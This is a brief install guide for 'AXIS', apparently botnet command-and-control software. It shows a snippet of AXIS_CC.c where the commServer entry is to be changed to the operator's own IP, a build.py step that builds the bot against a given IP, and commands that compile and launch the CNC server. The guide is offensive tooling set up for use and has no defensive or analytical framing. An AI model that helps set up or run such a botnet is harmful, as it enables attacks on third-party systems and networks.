# AXIS
Install:
kali@kali:~$ nano AXIS_CC.c

25 #define PRINT_BUF_LEN 12
26 #define std_packet 1460
27 
28 unsigned char *commServer[] = {"IP:606"};  <-- change server "IP" to your ip.
29
30 const char *useragents[] = {

kali@kali:~$ sudo python3 build.py AXIS_CC.c 192.168.178.58
kali@kali:~$ gcc AXIS_CNC.c -o AXIS -pthread
kali@kali:~$ sudo screen ./AXIS 606 1 909
